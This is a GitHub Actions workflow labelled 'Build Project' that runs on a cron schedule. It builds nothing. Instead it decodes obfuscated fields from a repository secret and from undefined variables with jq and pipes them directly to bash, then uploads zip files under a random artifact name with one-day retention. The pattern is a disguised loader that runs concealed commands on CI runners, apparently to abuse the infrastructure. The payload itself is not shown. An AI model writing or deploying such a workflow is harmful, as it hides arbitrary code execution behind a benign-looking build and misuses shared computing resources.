name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '3 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          t2: ${{ secrets.t2 }}
        run: |
          printf '%s' "$t2" | jq -r .ofsxk7 | /bin/bash
          echo $bh285 | jq -r .qd9597 | /bin/bash
          echo $t87 | jq -r .vvdyj9 | /bin/bash

      - name: Persist output
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: GqN7FeFk
          path: "*.zip"
          retention-days: 1
